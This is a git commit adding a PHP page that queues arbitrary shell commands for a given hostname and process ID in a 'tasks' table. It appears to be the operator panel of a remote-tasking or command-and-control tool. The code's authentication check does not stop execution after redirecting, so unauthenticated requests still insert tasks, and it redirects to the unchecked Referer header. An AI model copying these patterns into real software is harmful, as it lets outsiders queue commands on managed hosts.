fbf879b77fcfd2c6b4f2907097ec1d78dccc40b3
root <t3ntman@gmail.com>
2017-03-06 17:32:01 -0700

    Added in tasks entry insertion

---
+++ Website/commandSubmit.php
@@ -0,0 +1,29 @@
+<?php
+	# Necessary at the top of every page for session management
+    session_start();
+
+    include "connector.php";
+
+    # If unauthenticated
+    if (!isset($_SESSION["authenticated"])) {
+        header("Location: 403.php");
+    }
+
+    # Parses POST parameters
+    $hostname = $_POST["hostname"];
+    $process_id = $_POST["process_id"];
+    $command = $_POST["command"];
+
+    # Generates unique ID and inserts entry into "tasks" table
+    $statement = $database_connection->prepare("INSERT INTO tasks (`hostname`, `process_id`, `task_action`, `task_secondary`, `unique_id`) VALUES (:hostname, :process_id, :task_action, :task_secondary, :unique_id)");
+    $statement->bindValue(":hostname", $hostname);
+    $statement->bindValue(":process_id", $process_id);
+    $statement->bindValue(":task_action", "command");
+    $statement->bindValue(":task_secondary", $command);
+    $statement->bindValue(":unique_id", uniqid());
+    $statement->execute();
+	$statement->connection = null;
+
+    # Redirects to previous page
+    header("Location: " . $_SERVER["HTTP_REFERER"]);
+?>
